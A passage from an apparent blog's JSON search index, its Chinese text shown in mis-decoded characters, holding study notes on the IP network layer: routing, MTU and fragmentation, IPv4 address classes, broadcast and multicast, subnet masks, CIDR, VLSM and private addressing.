Unreachable\n","date":"2023-10-18T19:27:27+08:00","permalink":"https://anonymity-0.github.io/posts/%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE/","title":"åšå®¢é…ç½®"},{"content":"ç½‘ç»œå±‚ IP å³ç½‘é™…åè®®TCP/IP çš„å¿ƒè„æ˜¯äº’è”ç½‘å±‚ã€‚è¿™ä¸€å±‚ä¸»è¦ç”± IP (Internet Protocol)å’Œ ICMP (Internet Control Message Protocol)ä¸¤ä¸ªåè®®ç»„æˆã€‚ ç½‘ç»œå±‚çš„ä¸»è¦ä½œç”¨æ˜¯â€œå®ç°ç»ˆç«¯èŠ‚ç‚¹ä¹‹é—´çš„é€šä¿¡â€ã€‚è¿™ç§ç»ˆç«¯èŠ‚ç‚¹ä¹‹é—´çš„é€šä¿¡ä¹Ÿå« â€œç‚¹å¯¹ç‚¹(end-to-end)é€šä¿¡â€ã€‚\nä¸»æœºå’ŒèŠ‚ç‚¹ ä¸»æœºçš„å®šä¹‰åº”è¯¥æ˜¯æŒ‡â€œé…ç½®æœ‰Iåœ°å€,ä½†æ˜¯ä¸è¿›è¡Œè·¯ç”±æ§åˆ¶â€çš„è®¾å¤‡â€ã€‚æ—¢é…æœ‰IPåœ°å€åˆå…·æœ‰è·¯ç”±æ§åˆ¶èƒ½åŠ›çš„è®¾å¤‡å«åšâ€œè·¯ç”±å™¨â€,è·Ÿä¸»æœºæœ‰æ‰€åŒºåˆ«ã€‚è€ŒèŠ‚ç‚¹åˆ™æ˜¯ä¸»æœºå’Œè·¯ç”±å™¨çš„ç»Ÿç§°ã€‚\nIPåŸºç¡€çŸ¥è¯† IPåœ°å€ IPåœ°å€ç”¨äºåœ¨â€œè¿æ¥åˆ°ç½‘ç»œä¸­çš„æ‰€æœ‰ä¸»æœºä¸­è¯†åˆ«å‡ºè¿›è¡Œé€šä¿¡çš„ç›®æ ‡åœ°å€â€ ä¸è®ºä¸€å°ä¸»æœºä¸å“ªç§æ•°æ®é“¾è·¯è¿æ¥,å…¶IPåœ°å€çš„å½¢å¼éƒ½ä¿æŒä¸å˜ã€‚ä»¥å¤ªç½‘ã€æ— çº¿å±€åŸŸç½‘ã€PPP ç­‰,éƒ½ä¸ä¼šæ”¹å˜IPåœ°å€çš„å½¢å¼ã€‚ è€Œæ•°æ®é“¾è·¯çš„MACåœ°å€çš„å½¢å¼ä¸ä¸€å®šå¿…é¡»ä¸€è‡´ã€‚\nåœ¨ç½‘æ¡¥æˆ–äº¤æ¢é›†çº¿å™¨ç­‰ç‰©ç†å±‚æˆ–æ•°æ®é“¾è·¯å±‚æ•°æ®åŒ…è½¬å‘è®¾å¤‡ä¸­,ä¸éœ€è¦è®¾ç½®IPåœ°å€â€ã€‚å› ä¸ºè¿™äº›è®¾å¤‡åªè´Ÿè´£å°†IP åŒ…è½¬åŒ–ä¸º0ã€1 æ¯”ç‰¹æµè½¬å‘æˆ–å¯¹æ•°æ®é“¾è·¯å¸§çš„æ•°æ®éƒ¨åˆ†è¿›è¡Œè½¬å‘,è€Œä¸éœ€è¦åº”å¯¹IP åè®®â€\nè·¯ç”±æ§åˆ¶ è·¯ç”±æ§åˆ¶(Routing)æ˜¯æŒ‡å°†åˆ†ç»„æ•°æ®å‘é€åˆ°æœ€ç»ˆç›®æ ‡åœ°å€çš„åŠŸèƒ½ã€‚ Hop è¯‘ä¸ºä¸­æ–‡å«â€œè·³â€ã€‚å®ƒæ˜¯æŒ‡ç½‘ç»œä¸­çš„ä¸€ä¸ªåŒºé—´ã€‚ ä¸€è·³(1Hop)æ˜¯æŒ‡åˆ©ç”¨æ•°æ®é“¾è·¯å±‚ä»¥ä¸‹åˆ†å±‚çš„åŠŸèƒ½ä¼ è¾“æ•°æ®å¸§çš„ä¸€ä¸ªåŒºé—´ã€‚ ä»¥å¤ªç½‘ç­‰æ•°æ®é“¾è·¯ä¸­ä½¿ç”¨ MACåœ°å€ä¼ è¾“æ•°æ®å¸§ã€‚æ­¤æ—¶çš„ä¸€è·³æ˜¯æŒ‡ä»æºMACåœ°å€åˆ°ç›®æ ‡MACåœ°å€ä¹‹é—´ä¼ è¾“å¸§çš„åŒºé—´ã€‚ä¹Ÿå°±æ˜¯è¯´å®ƒæ˜¯ä¸»æœºæˆ–è·¯ç”±å™¨ç½‘å¡ä¸ç»å…¶ä»–è·¯ç”±å™¨è€Œèƒ½ç›´æ¥åˆ°è¾¾çš„ç›¸é‚»ä¸»æœºæˆ–è·¯ç”±å™¨ç½‘å¡ä¹‹é—´çš„ä¸€ä¸ªåŒºé—´ã€‚\nå¤šè·³è·¯ç”± IP åŒ…æ­£æ˜¯åœ¨ç½‘ç»œä¸­ä¸€ä¸ªä¸ªè·³é—´è¢«è½¬å‘ã€‚å› æ­¤ IPè·¯ç”±ä¹Ÿå«åšå¤šè·³è·¯ç”±ã€‚åœ¨æ¯ä¸€ä¸ªåŒºé—´å†…å†³å®šç€åŒ…åœ¨ä¸‹ä¸€è·³è¢«è½¬å‘çš„è·¯å¾„ã€‚ å¤šè·³è·¯ç”±æ˜¯æŒ‡è·¯ç”±å™¨æˆ–ä¸»æœºåœ¨è½¬å‘IP æ•°æ®åŒ…æ—¶åªæŒ‡å®šä¸‹ä¸€ä¸ªè·¯ç”±å™¨æˆ–ä¸»æœº, è€Œä¸æ˜¯å°†åˆ°æœ€ç»ˆç›®æ ‡åœ°å€ä¸ºæ­¢çš„æ‰€æœ‰é€šè·¯å…¨éƒ½æŒ‡å®šå‡ºæ¥ã€‚å› ä¸ºæ¯ä¸€ä¸ªåŒºé—´(è·³) åœ¨è½¬å‘ IPæ•°æ®åŒ…æ—¶ä¼šåˆ†åˆ«æŒ‡å®šä¸‹ä¸€è·³çš„æ“ä½œ,ç›´è‡³åŒ…è¾¾åˆ°æœ€ç»ˆçš„ç›®æ ‡åœ°å€ã€‚\nè·¯ç”±æ§åˆ¶è¡¨ ä¸ºäº†å°†æ•°æ®åŒ…å‘ç»™ç›®æ ‡ä¸»æœº,æ‰€æœ‰ä¸»æœºéƒ½ç»´æŠ¤ç€ä¸€å¼ è·¯ç”±æ§åˆ¶è¡¨(Routing Table)ã€‚è¯¥è¡¨è®°å½•IP æ•°æ®åœ¨ä¸‹ä¸€æ­¥åº”è¯¥å‘ç»™å“ªä¸ªè·¯ç”±å™¨ã€‚IPåŒ…å°†æ ¹æ®è¿™ä¸ªè·¯ç”±è¡¨åœ¨å„ä¸ªæ•°æ®é“¾è·¯ä¸Šä¼ è¾“ã€‚ æ•°æ®é“¾è·¯çš„æŠ½è±¡åŒ– IP æ˜¯å®ç°å¤šä¸ªæ•°æ®é“¾è·¯ä¹‹é—´é€šä¿¡çš„åè®®ï¼Œå¯¹IPçš„ä¸Šä¸€å±‚æ¥è¯´,ä¸è®ºåº•å±‚æ•°æ®é“¾è·¯ä½¿ç”¨ä»¥å¤ªç½‘è¿˜æ˜¯æ— çº¿LAN äº¦æˆ–æ˜¯PPP,éƒ½å°†è¢«ä¸€è§†åŒä»ã€‚\nä¸åŒæ•°æ®é“¾è·¯æœ‰ä¸ªæœ€å¤§çš„åŒºåˆ«,å°±æ˜¯å®ƒä»¬å„è‡ªçš„æœ€å¤§ä¼ è¾“å•ä½(MTU:Maximum Transmission Unit)ä¸åŒã€‚\nMTU çš„å€¼åœ¨ä»¥å¤ªç½‘ä¸­æ˜¯1500å­—èŠ‚,åœ¨FDDI ä¸­æ˜¯4352å­—èŠ‚,è€ŒATMåˆ™ä¸º9180å­—èŠ‚ã€‚IP çš„ä¸Šä¸€å±‚å¯èƒ½ä¼šè¦æ±‚ä¼ é€æ¯”è¿™äº› MTU æ›´å¤šå­—èŠ‚çš„æ•°æ®,å› æ­¤å¿…é¡»åœ¨çº¿è·¯ä¸Šä¼ é€æ¯”åŒ…é•¿è¿˜è¦å°çš„MTUã€‚\nä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜,IP è¿›è¡Œåˆ†ç‰‡å¤„ç†(IP Fragmentation)ã€‚é¡¾åæ€ä¹‰,æ‰€è°“åˆ†ç‰‡å¤„ç†æ˜¯æŒ‡,å°†è¾ƒå¤§çš„IP åŒ…åˆ†æˆå¤šä¸ªè¾ƒå°çš„IP åŒ…â€å³ä» IP çš„ä¸Šæ¬¡å±‚çœ‹,å®ƒå®Œå…¨å¯ä»¥å¿½ç•¥æ•°æ®åŒ…åœ¨é€”ä¸­çš„å„ä¸ªæ•°æ®é“¾è·¯ä¸Šçš„MTU,è€Œåªéœ€è¦æŒ‰ç…§æºåœ°å€å‘é€çš„é•¿åº¦æ¥æ”¶æ•°æ®åŒ…ã€‚ IP å°±æ˜¯ä»¥è¿™ç§æ–¹å¼æŠ½è±¡åŒ–äº†æ•°æ®é“¾è·¯å±‚,ä½¿å¾—ä»ä¸Šå±‚æ›´ä¸å®¹æ˜“çœ‹åˆ°åº•å±‚ç½‘ç»œæ„é€ çš„ç»†èŠ‚ã€‚\né¢å‘æ— è¿æ¥ IP é¢å‘æ— è¿æ¥ã€‚å³åœ¨å‘åŒ…ä¹‹å‰,ä¸éœ€è¦å»ºç«‹ä¸å¯¹ç«¯ç›®æ ‡åœ°å€ä¹‹é—´çš„è¿æ¥ã€‚ä¸Šå±‚å¦‚æœé‡åˆ°éœ€è¦å‘é€ç»™IP çš„æ•°æ®,è¯¥æ•°æ®ä¼šç«‹å³è¢«å‹ç¼©æˆ IPåŒ…å‘é€å‡ºå»ã€‚\né‚£ä¹ˆ,ä¸ºä»€ä¹ˆIP è¦é‡‡ç”¨é¢å‘æ— è¿æ¥å‘¢? ä¸»è¦æœ‰ä¸¤ç‚¹åŸå› :ä¸€æ˜¯ä¸ºäº†ç®€åŒ–,äºŒæ˜¯ä¸ºäº†æé€Ÿã€‚é¢å‘è¿æ¥æ¯”èµ·é¢å‘æ— è¿æ¥å¤„ç†ç›¸å¯¹å¤æ‚ã€‚ç”šè‡³ç®¡ç†æ¯ä¸ªè¿æ¥æœ¬èº«å°±æ˜¯ä¸€ä¸ªç›¸å½“ç¹ççš„äº‹æƒ…ã€‚æ­¤å¤–,æ¯æ¬¡é€šä¿¡ä¹‹å‰éƒ½è¦äº‹å…ˆå»ºç«‹è¿æ¥,åˆä¼šé™ä½å¤„ç†é€Ÿåº¦ã€‚éœ€è¦æœ‰è¿æ¥æ—¶,å¯ä»¥å§”æ‰˜ä¸Šä¸€å±‚æä¾›æ­¤é¡¹æœåŠ¡ã€‚å› æ­¤,IP ä¸ºäº†å®ç°ç®€å•åŒ–ä¸é«˜é€ŸåŒ–é‡‡ç”¨é¢å‘æ— è¿æ¥çš„æ–¹å¼ã€‚ IP æä¾›å°½åŠ›æœåŠ¡(Best Effort),æ„æŒ‡â€œä¸ºäº†æŠŠæ•°æ®åŒ…å‘é€åˆ°æœ€ç»ˆç›®æ ‡åœ°å€,å°½æœ€å¤§åŠªåŠ›ã€‚â€ç„¶è€Œ,å®ƒå¹¶ä¸åšâ€œæœ€ç»ˆæ”¶åˆ°ä¸å¦çš„éªŒè¯â€ã€‚IPæ•°æ®åŒ…åœ¨é€”ä¸­å¯èƒ½ä¼šå‘ç”Ÿä¸¢åŒ…ã€é”™ä½ä»¥åŠæ•°æ®é‡ç¿»å€ç­‰é—®é¢˜ã€‚\né‚£ä¹ˆ,æœ‰äººå¯èƒ½ä¼šæå‡ºç–‘é—®:ä¸ºä»€ä¹ˆä¸è®©IP å…·æœ‰å¯é ä¼ è¾“çš„åŠŸèƒ½, ä»è€ŒæŠŠè¿™ä¸¤ç§åè®®åˆå¹¶åˆ°ä¸€èµ·å‘¢?\nè¿™å…¶ä¸­çš„ç¼˜ç”±å°±åœ¨äº,å¦‚æœè¦ä¸€ç§åè®®è§„å®šæ‰€æœ‰çš„åŠŸèƒ½å’Œä½œç”¨,é‚£ä¹ˆè¯¥åè®®çš„å…·ä½“å®æ–½å’Œç¼–ç¨‹å°±ä¼šå˜å¾—éå¸¸å¤æ‚,æ— æ³•è½»æ˜“å®ç°ã€‚ç›¸æ¯”ä¹‹ä¸‹,æŒ‰ç…§ç½‘ç»œåˆ†å±‚,æ˜ç¡®å®šä¹‰æ¯å±‚åè®®çš„ä½œç”¨å’Œè´£ä»»ä»¥å,é’ˆå¯¹æ¯å±‚å…·ä½“çš„åè®®è¿›è¡Œç¼–ç¨‹ä¼šæ›´åŠ æœ‰åˆ©äºè¯¥åè®®çš„å®ç°ã€‚ ç½‘ç»œé€šä¿¡ä¸­å¦‚æœèƒ½è¿›è¡Œæœ‰æ•ˆåˆ†å±‚,å°±å¯ä»¥æ˜ç¡® TCP ä¸IP å„è‡ªåè®®çš„æœ€ç»ˆç›®çš„,ä¹Ÿæœ‰åˆ©äºåç»­å¯¹è¿™äº›åè®®è¿›è¡Œæ‰©å±•å’Œæ€§èƒ½ä¸Šçš„ä¼˜åŒ–ã€‚åˆ†å±‚ä¹Ÿç®€åŒ–äº†æ¯ä¸ªåè®®çš„å…·ä½“å®ç°ã€‚\nIPv4 IP åœ°å€(IPv4 åœ°å€)ç”±32ä½æ­£æ•´æ•°æ¥è¡¨ç¤ºï¼Œå°†32ä½çš„IPåœ°å€ä»¥æ¯8ä½ä¸ºä¸€ç»„,åˆ†æˆ4ç»„,æ¯ç»„ä»¥â€œ.â€éš”å¼€,å†å°†æ¯ç»„æ•°è½¬æ¢ä¸ºåè¿›åˆ¶æ•°â€\nå®é™…ä¸Š,IPåœ°å€å¹¶éæ˜¯æ ¹æ®ä¸»æœºå°æ•°æ¥é…ç½®çš„,è€Œæ˜¯æ¯ä¸€å°ä¸»æœºä¸Šçš„æ¯ä¸€å—ç½‘å¡(NIC)éƒ½å¾—è®¾ç½®IP åœ°å€â€ã€‚é€šå¸¸ä¸€å—ç½‘å¡åªè®¾ç½®ä¸€ä¸ª IP åœ°å€,å…¶å®ä¸€å—ç½‘å¡ä¹Ÿå¯ä»¥é…ç½®å¤šä¸ª IP åœ°å€ã€‚æ­¤å¤–,ä¸€å°è·¯ç”±å™¨é€šå¸¸éƒ½ä¼šé…ç½®ä¸¤ä¸ªä»¥ä¸Šçš„ç½‘å¡,å› æ­¤å¯ä»¥è®¾ç½®ä¸¤ä¸ªä»¥ä¸Šçš„IPåœ°å€ã€‚ IP åœ°å€ç”±â€œç½‘ç»œæ ‡è¯†(ç½‘ç»œåœ°å€)â€å’Œâ€œä¸»æœºæ ‡è¯†(ä¸»æœºåœ°å€)â€ä¸¤éƒ¨åˆ†ç»„æˆâ€\nç½‘ç»œæ ‡è¯†å¿…é¡»ä¿è¯ç›¸äº’è¿æ¥çš„æ¯ä¸ªæ®µçš„åœ°å€ä¸ç›¸é‡å¤ã€‚è€Œç›¸åŒæ®µå†…ç›¸è¿çš„ä¸»æœºå¿…é¡»æœ‰ç›¸åŒçš„ç½‘ç»œåœ°å€ã€‚IPåœ°å€çš„â€œä¸»æœºæ ‡è¯†â€åˆ™ä¸å…è®¸åœ¨åŒä¸€ä¸ªç½‘æ®µå†…é‡å¤å‡ºç°ã€‚\nç©¶ç«ä»ç¬¬å‡ ä½å¼€å§‹åˆ°ç¬¬å‡ ä½ç®—æ˜¯ç½‘ç»œæ ‡è¯†,åˆä»ç¬¬å‡ ä½å¼€å§‹åˆ°ç¬¬å‡ ä½ç®—æ˜¯ä¸»æœºæ ‡è¯†å‘¢?å…³äºè¿™ç‚¹,æœ‰çº¦å®šä¿—æˆçš„ä¸¤ç§ç±»å‹ã€‚æœ€åˆäºŒè€…ä»¥åˆ†ç±»è¿›è¡ŒåŒºåˆ«ã€‚è€Œç°åœ¨åŸºæœ¬ä»¥å­ç½‘æ©ç (ç½‘ç»œå‰ç¼€)åŒºåˆ†ã€‚ IPåœ°å€çš„åˆ†ç±» IP åœ°å€åˆ†ä¸ºå››ä¸ªçº§åˆ«,åˆ†åˆ«ä¸ºAç±»ã€Bç±»ã€Cç±»ã€Dç±»â€ã€‚å®ƒæ ¹æ® IP åœ°å€ä¸­ä»ç¬¬1ä½åˆ°ç¬¬4ä½çš„æ¯”ç‰¹åˆ—å¯¹å…¶ç½‘ç»œæ ‡è¯†å’Œä¸»æœºæ ‡è¯†è¿›è¡ŒåŒºåˆ†ã€‚ å…³äºåˆ†é…IP ä¸»æœºåœ°å€çš„æ³¨æ„äº‹é¡¹ åœ¨åˆ†é… IP åœ°å€æ—¶å…³äºä¸»æœºæ ‡è¯†æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„ã€‚å³è¦ç”¨æ¯”ç‰¹ä½è¡¨ç¤ºä¸»æœºåœ°å€æ—¶,ä¸å¯ä»¥å…¨éƒ¨ä¸º0æˆ–å…¨éƒ¨ä¸º1ã€‚å› ä¸ºå…¨éƒ¨ä¸ºåªæœ‰ã€‚åœ¨è¡¨ç¤ºå¯¹åº”çš„ç½‘ç»œåœ°å€æˆ–IP åœ°å€ä¸å¯è·çŸ¥çš„æƒ…å†µä¸‹æ‰ä½¿ç”¨ã€‚è€Œå…¨éƒ¨ä¸º1çš„ä¸»æœºåœ°å€é€šå¸¸ä½œä¸ºå¹¿æ’­åœ°å€ã€‚\nå¹¿æ’­åœ°å€ å¹¿æ’­åœ°å€ç”¨äºåœ¨åŒä¸€ä¸ªé“¾è·¯ä¸­ç›¸äº’è¿æ¥çš„ä¸»æœºä¹‹é—´å‘é€æ•°æ®çš„ç›®çš„ä¸»æœºåœ°å€éƒ¨åˆ†å…¨éƒ¨è®¾ç½®ä¸º1,å°±æˆä¸ºäº†å¹¿æ’­åœ°å€ã€‚\nä»¥å¤ªç½‘ä¸­å¦‚æœå°† MACåœ°å€çš„æ‰€æœ‰ä½éƒ½æ”¹ä¸º1,åˆ™å½¢æˆFF:FF: FF: FF: FF: FF çš„å¹¿æ’­åœ°å€ã€‚å› æ­¤, å¹¿æ’­çš„IPåŒ…ä»¥æ•°æ®é“¾è·¯çš„å¸§çš„å½¢å¼å‘é€æ—¶,å¾—é€šè¿‡ MAC åœ°å€ä¸ºå…¨ 1 æ¯”ç‰¹çš„ FF:FF: FF: FF: FF: FFè½¬å‘ã€‚\næœ¬åœ°å¹¿æ’­ åœ¨æœ¬ç½‘ç»œå†…çš„å¹¿æ’­å«åšæœ¬åœ°å¹¿æ’­ã€‚ä¾‹å¦‚ç½‘ç»œåœ°å€ä¸º192.168.0.0/24 çš„æƒ…å†µä¸‹,å¹¿æ’­åœ°å€æ˜¯192.168.0.255ã€‚å› ä¸ºè¿™ä¸ªå¹¿æ’­åœ°å€çš„ IPåŒ…ä¼šè¢«è·¯ç”±å™¨å±è”½,æ‰€ä»¥ä¸ä¼šåˆ°è¾¾192.168.0.0/24 ä»¥å¤–çš„å…¶ä»–é“¾è·¯ä¸Šã€‚\nç›´æ¥å¹¿æ’­ åœ¨ä¸åŒç½‘ç»œä¹‹ çš„å¹¿æ’­å«åšç›´æ¥å¹¿æ’­ã€‚ä¾‹å¦‚ç½‘ç»œåœ°å€ä¸º192.168.0.0/24çš„ä¸»æœºå‘ 192.168.1.255/24 çš„ç›®æ ‡åœ°å€å‘é€IP åŒ…ã€‚æ”¶åˆ°è¿™ä¸ªåŒ…çš„è·¯ç”±å™¨,å°†æ•°æ®è½¬å‘ç»™192.168.1.0/24,ä»è€Œä½¿å¾—æ‰€æœ‰192.168.1.1~ 192. 168.1.254 çš„ä¸»æœºéƒ½èƒ½æ”¶åˆ°è¿™ä¸ªåŒ…â€\nIPå¤šæ’­ å¤šæ’­ç”¨äºå°†åŒ…å‘é€ç»™ç‰¹å®šç»„å†…çš„æ‰€æœ‰ä¸»æœºã€‚ç”±äºå…¶ç›´æ¥ä½¿ç”¨IP åè®®,å› æ­¤ä¹Ÿä¸å­˜åœ¨å¯é ä¼ è¾“ã€‚ å¤šæ’­ä½¿ç”¨Dç±»åœ°å€ã€‚å› æ­¤,å¦‚æœä»é¦–ä½å¼€å§‹åˆ°ç¬¬4ä½æ˜¯â€œ1110â€,å°±å¯ä»¥è®¤ä¸ºæ˜¯å¤šæ’­åœ°å€ã€‚è€Œå‰©ä¸‹çš„28 ä½å¯ä»¥æˆä¸ºå¤šæ’­çš„ç»„ç¼–å·ã€‚ ä»224.0.0.0åˆ° 239.255.255.255 éƒ½æ˜¯å¤šæ’­åœ°å€çš„å¯ç”¨èŒƒå›´ã€‚å…¶ä¸­ä»224.0.0.0åˆ°224.0.0.255 çš„èŒƒå›´ä¸éœ€è¦è·¯ç”±æ§åˆ¶,åœ¨åŒä¸€ä¸ªé“¾è·¯å†…ä¹Ÿèƒ½å®ç°å¤šæ’­ã€‚è€Œåœ¨è¿™ä¸ªèŒƒå›´ä¹‹å¤–è®¾ç½®å¤šæ’­åœ°å€ä¼šç»™å…¨ç½‘æ‰€æœ‰ç»„å†…æˆå‘˜å‘é€å¤šæ’­çš„åŒ…ã€‚\nåˆ©ç”¨IPå¤šæ’­å®ç°é€šä¿¡,é™¤äº†åœ°å€å¤–è¿˜éœ€è¦IGMP\u0026rsquo;ç­‰åè®®çš„æ”¯æŒã€‚ å­ç½‘æ©ç  ä¾‹ï¼š Aç±» 255.0.0.0 Bç±»255.255.0.0 Cç±» 255.255.255.0\nç½‘ç»œæ ‡è¯†ç›¸åŒçš„è®¡ç®—æœºå¿…é¡»åŒå±äºåŒä¸€ä¸ªé“¾è·¯ã€‚ä¾‹å¦‚,æ¶æ„Bç±»IP ç½‘ç»œæ—¶, ç†è®ºä¸Šä¸€ä¸ªé“¾è·¯å†…å…è®¸6ä¸‡5åƒå¤šå°è®¡ç®—æœºè¿æ¥ã€‚ç„¶è€Œ,åœ¨å®é™…ç½‘ç»œæ¶æ„å½“ä¸­, ä¸€èˆ¬ä¸ä¼šæœ‰åœ¨åŒä¸€ä¸ªé“¾è·¯ä¸Šè¿æ¥6ä¸‡5åƒå¤šå°è®¡ç®—æœºçš„æƒ…å†µã€‚å› æ­¤,è¿™ç§ç½‘ç»œç»“æ„å®é™…ä¸Šæ˜¯ä¸å­˜åœ¨çš„ã€‚\nå› æ­¤,ç›´æ¥ä½¿ç”¨Aç±»æˆ–Bç±»åœ°å€,ç¡®å®æœ‰äº›æµªè´¹ã€‚éšç€äº’è”ç½‘çš„è¦†ç›–èŒƒå›´é€æ¸å¢å¤§,ç½‘ç»œåœ°å€ä¼šè¶Šæ¥è¶Šä¸è¶³ä»¥åº”å¯¹éœ€æ±‚,ç›´æ¥ä½¿ç”¨Aç±»ã€Bç±»ã€Cç±»åœ°å€å°±æ›´åŠ æ˜¾å¾—æµªè´¹èµ„æºã€‚ä¸ºæ­¤,äººä»¬å·²ç»å¼€å§‹ä¸€ç§æ–°çš„ç»„åˆæ–¹å¼ä»¥å‡å°‘è¿™ç§æµªè´¹ã€‚\nå¯¹äºå­ç½‘æ©ç ,ç›®å‰æœ‰ä¸¤ç§è¡¨ç¤ºæ–¹å¼ã€‚ä»¥172.20.100.52çš„å‰26ä½æ˜¯ç½‘ç»œåœ°å€çš„æƒ…å†µä¸ºä¾‹,ä»¥ä¸‹æ˜¯å…¶ä¸­ä¸€ç§è¡¨ç¤ºæ–¹æ³•,å®ƒå°†IPåœ°å€ä¸å­ç½‘æ©ç çš„åœ°å€åˆ†åˆ«ç”¨ä¸¤è¡Œæ¥è¡¨ç¤ºã€‚ å¦ä¸€ç§è¡¨ç¤ºæ–¹å¼å¦‚ä¸‹æ‰€ç¤ºã€‚å®ƒåœ¨æ¯ä¸ª IP åœ°å€åé¢è¿½åŠ ç½‘ç»œåœ°å€çš„ä½æ•°â€ç”¨â€œ/â€éš”å¼€ CIDR é‡‡ç”¨ä»»æ„é•¿åº¦åˆ†å‰² IP åœ°å€çš„ç½‘ç»œæ ‡è¯†å’Œä¸»æœºæ ‡è¯†ã€‚è¿™ç§æ–¹å¼å«åšCIDR æ ¹æ® CIDR,è¿ç»­å¤šä¸ªCç±»åœ°å€â€å°±å¯ä»¥åˆ’åˆ†åˆ°ä¸€ä¸ªè¾ƒå¤§çš„ç½‘ç»œå†…ã€‚CIDR æ›´æœ‰æ•ˆåœ°åˆ©ç”¨äº†å½“å‰ IPv4åœ°å€,åŒæ—¶é€šè¿‡è·¯ç”±é›†ä¸­â€œé™ä½äº†è·¯ç”±å™¨çš„è´Ÿæ‹…ã€‚ VLSM åœ¨CIDRè¢«åº”ç”¨åˆ°äº’è”ç½‘çš„åˆæœŸ,ç½‘ç»œå†…éƒ¨é‡‡ç”¨å›ºå®šé•¿åº¦çš„å­ç½‘æ©ç æœºåˆ¶ã€‚ä¹Ÿå°±æ˜¯è¯´,å½“å­ç½‘æ©ç çš„é•¿åº¦è¢«è®¾ç½®ä¸º/25ä»¥å,åŸŸå†…æ‰€æœ‰çš„å­ç½‘æ©ç éƒ½å¾—ä½¿ç”¨åŒæ ·çš„é•¿åº¦ã€‚ç„¶è€Œ,æœ‰äº›éƒ¨é—¨å¯èƒ½æœ‰500å°ä¸»æœº,å¦ä¸€äº›éƒ¨é—¨å¯èƒ½åªæœ‰50å°ä¸»æœºã€‚å¦‚æœå…¨éƒ¨é‡‡ç”¨ç»Ÿä¸€æ ‡å‡†,å°±éš¾ä»¥æ¶æ„ä¸€ä¸ªé«˜æ•ˆçš„ç½‘ç»œç»“æ„ã€‚ä¸ºæ­¤äººä»¬æå‡ºç»„ç»‡å†…è¦ä½¿ç”¨å¯å˜é•¿åº¦çš„ã€é«˜æ•ˆçš„IPåœ°å€åˆ†é…æ–¹å¼ã€‚\näºæ˜¯äº§ç”Ÿäº†ä¸€ç§å¯ä»¥éšæœºä¿®æ”¹ç»„ç»‡å†…å„ä¸ªéƒ¨é—¨çš„å­ç½‘æ©ç é•¿åº¦çš„æœºåˆ¶VLSM(å¯å˜é•¿å­ç½‘æ©ç )ã€‚å®ƒå¯ä»¥é€šè¿‡åŸŸé—´è·¯ç”±åè®®è½¬æ¢ä¸º RIP2 ä»¥åŠ OSPFå®ç°ã€‚æ ¹æ® VLSM å¯ä»¥å°†ç½‘ç»œåœ°å€åˆ’åˆ†ä¸ºä¸»æœºæ•°ä¸º500ä¸ªæ—¶å­ç½‘æ©ç é•¿åº¦ä¸º/23,ä¸»æœºæ•°ä¸º50ä¸ªæ—¶å­ç½‘æ©ç é•¿åº¦ä¸º/26ã€‚\næœ‰äº† CIDR å’Œ VLSMæŠ€æœ¯,ç¡®å®ç›¸å¯¹ç¼“è§£äº†å…¨å±€IPåœ°å€ä¸å¤Ÿç”¨çš„é—®é¢˜ã€‚ä½†æ˜¯IP åœ°å€çš„ç»å¯¹æ•°æœ¬èº«æœ‰é™çš„äº‹å®æ— æ³•æ”¹å˜ã€‚\nå…¨å±€åœ°å€ä¸ç§æœ‰åœ°å€ å‡ºç°äº†ä¸€ç§æ–°æŠ€æœ¯ã€‚å®ƒä¸è¦æ±‚ä¸ºæ¯ä¸€å°ä¸»æœºæˆ–è·¯ç”±å™¨åˆ†é…ä¸€ä¸ªå›ºå®šçš„IP åœ°å€,è€Œæ˜¯åœ¨å¿…è¦çš„æ—¶å€™åªä¸ºç›¸åº”æ•°é‡çš„è®¾å¤‡åˆ†é…å”¯ä¸€çš„IPåœ°å€ã€‚ å°¤å…¶å¯¹äºé‚£äº›æ²¡æœ‰è¿æ¥äº’è”ç½‘çš„ç‹¬ç«‹ç½‘ç»œä¸­çš„ä¸»æœº,åªè¦ä¿è¯åœ¨è¿™ä¸ªç½‘ç»œå†…åœ°å€å”¯ä¸€,å¯ä»¥ä¸ç”¨è€ƒè™‘äº’è”ç½‘å³å¯é…ç½®ç›¸åº”çš„IPåœ°å€ã€‚\nç§æœ‰ç½‘ç»œçš„IP åœ°å€ã€‚å®ƒçš„åœ°å€èŒƒå›´å¦‚ä¸‹æ‰€ç¤º: Aç±»~Cç±»èŒƒå›´ä¸­é™¤å»0/8ã€127/8ã€‚ åŒ…å«åœ¨è¿™ä¸ªèŒƒå›´å†…çš„IPåœ°å€éƒ½å±äºç§æœ‰ IP,è€Œåœ¨æ­¤ä¹‹å¤–â€çš„IPåœ°å€ç§°ä¸ºå…¨å±€IPã€‚ å…¨å±€ IPåœ°å€åŸºæœ¬ä¸Šè¦åœ¨æ•´ä¸ªäº’è”ç½‘èŒƒå›´å†…ä¿æŒå”¯ä¸€\u0026rsquo;,ä½†ç§æœ‰åœ°å€ä¸éœ€è¦ã€‚åªè¦åœ¨åŒä¸€ä¸ªåŸŸé‡Œä¿è¯å”¯ä¸€å³å¯ã€‚åœ¨ä¸åŒçš„åŸŸé‡Œå‡ºç°ç›¸åŒçš„ç§æœ‰IP ä¸ä¼šå½±å“ä½¿ç”¨ã€‚\nåœ¨ä¸–ç•ŒèŒƒå›´å†…,å…¨å±€ IP ç”±ICANN\u0026lsquo;è¿›è¡Œç®¡ç†ã€‚å¯¹äº FTTH å’Œ ADSL çš„æœåŠ¡,ç½‘ç»œæä¾›å•†ç›´æ¥ç»™ç”¨æˆ·åˆ†é…å…¨å±€ IPåœ°å€,å¹¶ä¸”ç”¨æˆ·æ¯æ¬¡é‡è¿è¯¥IPåœ°å€éƒ½å¯èƒ½ä¼šå‘ç”Ÿå˜åŒ–ã€‚è¿™æ—¶çš„IP åœ°å€ç”±æä¾›å•†ç»´æŠ¤,ä¸éœ€è¦ç”¨æˆ·äº²è‡ªç”³è¯·å…¨å±€ IP åœ°å€ã€‚\nä¸è¿‡ç°åœ¨,æ™®éé‡‡ç”¨çš„ä¸€ç§æ–¹å¼æ˜¯,åœ¨LAN ä¸­è®¾ç½®ç§æœ‰åœ°å€,é€šè¿‡å°‘æ•°è®¾ç½®å…¨å±€IP åœ°å€çš„ä»£ç†æœåŠ¡å™¨ç»“åˆ NATçš„è®¾ç½®è¿›è¡Œäº’è”ç½‘é€šä¿¡ã€‚è¿™æ—¶ IPåœ°å€ä¸ªæ•°å°±ä¸é™äºLAN 